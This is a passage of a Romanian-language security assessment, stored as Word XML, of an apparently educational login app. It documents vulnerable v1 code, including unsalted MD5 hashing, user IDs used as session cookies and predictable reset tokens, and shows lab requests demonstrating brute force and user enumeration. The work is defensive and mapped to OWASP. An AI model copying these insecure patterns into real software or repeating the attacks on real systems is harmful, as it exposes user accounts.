      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Fragment cod v1 (main.py):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if not db_user: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raise HTTPException(status_code=404, detail="User inexistent")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password_hash = hashlib.md5(user.password.encode()).hexdigest()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if db_user['password_hash'] != password_hash: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raise HTTPException(status_code=401, detail="Parola gresita")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session_token = f"{db_user['id']}"   # ← Predictibil!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response.set_cookie(key="session_id", value=session_token)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E6EB5"/>
        </w:rPr>
        <w:t>3.3 Logout</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Endpoint: POST /logout (implementat doar in v2)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>In v1, nu exista un endpoint de logout. Sesiunile nu sunt stocate</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>in baza de date in v1. „Sesiunea" este de fapt doar ID-ul utilizatorului</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>setat ca si cookie, deci nu poate fi invalidata. Cookie-ul ramane valid</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>pana la expirare sau pana cand browserul il sterge local.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E6EB5"/>
        </w:rPr>
        <w:t>3.4 Resetare parola</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Endpoint: POST /request-reset + POST /reset-password</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Comportament v1 (vulnerabil):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>1. POST /request-reset cu { "email": "user@example.com" }</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>2. Cauta utilizatorul in DB.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>3. Genereaza token = Base64(email) (complet predictibil!).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>4. Salveaza token-ul in tabela reset_tokens FARA data de expirare.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>5. Returneaza link-ul cu token-ul in clear in raspunsul JSON.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>6. POST /reset-password cu { "token": "...", "new_password": "..." }</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>7. Verifica daca token-ul exista in DB (fara verificarea expirarii).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>8. Actualizeaza parola cu noul MD5.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>9. NU sterge token-ul! Acesta poate fi reutilizat nelimitat.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E6EB5"/>
        </w:rPr>
        <w:t>3.5 Gestionare sesiuni</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>In v1, sesiunile sunt simulate prin stocarea ID-ului numeric al</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>utilizatorului ca valoare a cookie-ului session_id. Nu exista nici</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>o sesiune reala in baza de date. Orice cerere care include cookie-ul</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>cu un ID de utilizator valid este considerata autentificata.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>In v2, sesiunile sunt gestionate corect:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>- Token generat cu secrets.token_urlsafe(32) (256 biti entropie)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>- Stocat in tabela sessions cu timestamp de expirare (8 ore)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>- Validat la fiecare request prin interogarea DB</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>- Sters la logout (invalidate_session)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>- Regenerat la fiecare login (rotatie token)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="1F397D"/>
        </w:rPr>
        <w:t>4. PREZENTAREA VULNERABILITATILOR – DESCRIERE TEHNICA SI OWASP MAPPING</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E6EB5"/>
        </w:rPr>
        <w:t>4.1 Politica de parola slaba (Weak Password Policy)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Descriere tehnica:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Aplicatia v1 nu impune nicio restrictie asupra parolei la inregistrare.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Sunt acceptate parole de un singur caracter, parole comune sau complet</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>lipsite de complexitate. Practic, orice sir de caractere trece validarea.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>OWASP Mapping:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>- A07:2021 – Identification and Authentication Failures</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>- CWE-521: Weak Password Requirements</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Risc: INALT</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Utilizatorii cu parole slabe sunt vulnerabili la atacuri de tip</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>brute force, dictionary attack si credential stuffing.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Dovada: Inregistrare cu parola "a" (1 caracter):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>REQUEST: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POST http://127.0.0.1:8000/register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Content-Type: application/json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{ "email": "test@authx.local", "password": "a" }</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>RESPONSE (HTTP 200 OK):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{ "message": "Utilizator inregistrat cu succes!" }</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Observatie: Serverul accepta parola fara nicio validare.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E6EB5"/>
        </w:rPr>
        <w:t>4.2 Stocare nesigura a parolelor – MD5 fara salt</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Descriere tehnica:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Parolele sunt stocate in baza de date ca hash-uri MD5 (Message Digest 5)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>fara salt. MD5 este un algoritm criptografic RUPT, inadecvat pentru</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>stocarea parolelor din urmatoarele motive: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- Exista tabele rainbow precalculate pentru milioane de parole comune.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- Un GPU modern poate calcula MILIARDE de hash-uri MD5 pe secunda.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- Fara salt, doi utilizatori cu aceeasi parola au hash-uri identice,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permitand atacurile de corelatie.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>OWASP Mapping:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>- A02:2021 – Cryptographic Failures</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>- CWE-916: Use of Password Hash With Insufficient Computational Effort</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>- CWE-759: Use of a One-Way Hash without a Salt</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Risc: CRITIC</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Daca un atacator obtine acces la fisierul bazei de date (prin SQL</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Injection, acces fizic, backup nesecurizat etc.), poate recupera</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>parolele in text clar aproape instantaneu folosind site-uri de tipul</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>crackstation.net sau hashcat cu tabele rainbow.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Dovada – hash MD5 al parolei „password" in DB:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Hash stocat in DB: 5f4dcc3b5aa765d61d8327deb882cf99</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Verificare locala: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&gt;&gt;&gt; import hashlib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&gt;&gt;&gt; hashlib.md5(b"password").hexdigest()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'5f4dcc3b5aa765d61d8327deb882cf99'</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Acelasi hash apare pentru toti utilizatorii cu parola „password",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>demonstrand lipsa salt-ului si permitand atacuri de corelatie.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E6EB5"/>
        </w:rPr>
        <w:t>4.3 Brute Force / Lipsa rate limiting</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Descriere tehnica:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Endpoint-ul POST /login din v1 nu limiteaza numarul de incercari de</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>autentificare. Un atacator poate trimite un numar nelimitat de cereri</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>cu parole diferite fara nicio penalizare sau intarziere.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>OWASP Mapping:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>- A07:2021 – Identification and Authentication Failures</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>- CWE-307: Improper Restriction of Excessive Authentication Attempts</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Risc: INALT</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Combinat cu politica de parola slaba (4.1), atacul devine extrem de</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>eficient. Un atacator poate sparge un cont in secunde daca parola</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>este in top 1000 parole comune.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Dovada – 6 cereri consecutive fara blocare:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>REQUEST 1: POST /login { "email": "admin@authx.local", "password": "123456" }</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>RESPONSE: HTTP 401 – { "detail": "Parola gresita" }</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>REQUEST 2: POST /login { "email": "admin@authx.local", "password": "12345678" }</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>RESPONSE: HTTP 401 – { "detail": "Parola gresita" }</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>REQUEST 3: POST /login { "email": "admin@authx.local", "password": "admin" }</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>RESPONSE: HTTP 401 – { "detail": "Parola gresita" }</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>REQUEST 4: POST /login { "email": "admin@authx.local", "password": "authx123" }</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>RESPONSE: HTTP 401 – { "detail": "Parola gresita" }</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>REQUEST 5: POST /login { "email": "admin@authx.local", "password": "parola1" }</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>RESPONSE: HTTP 401 – { "detail": "Parola gresita" }</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>REQUEST 6: POST /login { "email": "admin@authx.local", "password": "password" }</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>RESPONSE: HTTP 200 – { "message": "Login reusit!" }</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Set-Cookie: session_id=1; Path=/; SameSite=lax</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Observatie: 6 incercari, nicio blocare, parola descoperita.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E6EB5"/>
        </w:rPr>
        <w:t>4.4 User Enumeration – Mesaje de eroare diferentiate</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Descriere tehnica:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Endpoint-ul POST /login returneaza mesaje de eroare diferite in functie</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>de motivul esecului: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- HTTP 404 cu "User inexistent"  → daca email-ul nu exista in DB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- HTTP 401 cu "Parola gresita"  → daca email-ul exista dar parola e gresita</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Aceasta diferenta permite unui atacator sa determine cu certitudine</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>care adrese de email sunt inregistrate in sistem, fara a cunoaste parola.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>OWASP Mapping:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>- A07:2021 – Identification and Authentication Failures</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>- CWE-204: Observable Response Discrepancy</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Risc: MEDIU (amplificator pentru alte atacuri)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Prin enumerarea utilizatorilor, atacatorul poate construi o lista</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>precisa de tinte valide pentru atacuri de brute force sau phishing.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Dovada:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Test cu email INEXISTENT:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>REQUEST: POST /login { "email": "inexistent@authx.local", "password": "orice" }</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>RESPONSE: HTTP 404 – { "detail": "User inexistent" }</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Test cu email EXISTENT (parola gresita):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>REQUEST: POST /login { "email": "admin@authx.local", "password": "orice" }</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>RESPONSE: HTTP 401 – { "detail": "Parola gresita" }</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Concluzie: doar din codurile HTTP (404 vs 401) si mesajele text,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>atacatorul stie ca admin@authx.local EXISTA in baza de date.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E6EB5"/>
        </w:rPr>
        <w:t>4.5 Gestionare nesigura a sesiunilor</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Descriere tehnica:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Sesiunea in v1 este implementata ca un simplu cookie cu valoarea egala</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>cu ID-ul numeric al utilizatorului in baza de date. Exista multiple</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>probleme:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>a) Predictibilitate: cookie-ul session_id=1 inseamna utilizatorul cu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id=1. Un atacator poate impersona orice utilizator setand manual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cookie-ul la 2, 3, 4, etc.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>b) Lipsa HttpOnly: cookie-ul poate fi accesat din JavaScript front-end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via document.cookie, permitand furtul sesiunii prin atacuri XSS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(Cross-Site Scripting).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>c) Lipsa SameSite=Strict: cookie-ul este trimis automat in cereri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initiate din alte domenii, permitand atacuri CSRF.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>d) Durata excesiva: fara mecanisme de expirare, sesiunea ramane valida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indefinit dupa logout (deoarece nu exista logout in v1).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>OWASP Mapping:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>- A07:2021 – Identification and Authentication Failures</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>- A01:2021 – Broken Access Control (impersonare prin predictibilitate)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>- CWE-539: Use of Persistent Cookies Containing Sensitive Information</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>- CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Risc: CRITIC</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
